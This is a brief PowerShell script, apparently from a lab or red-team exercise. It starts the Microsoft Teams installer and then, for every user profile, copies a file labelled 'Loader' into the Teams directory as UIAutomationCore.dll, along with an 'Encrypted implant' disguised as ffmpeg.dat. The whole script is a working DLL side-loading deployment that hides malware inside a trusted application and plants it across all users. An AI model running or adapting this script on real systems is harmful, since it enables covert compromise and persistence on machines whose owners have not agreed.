# Init Folders
Start-Job -ScriptBlock { Start-Process -PSPath 'C:\Program Files (x86)\Teams Installer\Teams.exe' }
Start-Sleep -Seconds 5

# Transfer files into install dir
Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\LunarUI.bin" $_"\AppData\Local\Microsoft\Teams\UIAutomationCore.dll" } # Loader
Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\ffmpeg.dat" $_"\AppData\Local\Microsoft\Teams\ffmpeg.dat" }            # Encrypted implant
